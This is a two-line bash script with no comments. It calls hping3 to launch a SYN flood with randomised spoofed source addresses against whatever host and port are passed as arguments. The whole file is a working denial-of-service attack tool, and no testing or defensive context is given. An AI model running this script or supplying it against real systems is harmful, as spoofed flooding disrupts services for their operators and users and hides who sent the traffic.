#!/bin/bash
hping3 -S --flood --rand-source -V -p "$2" "$1"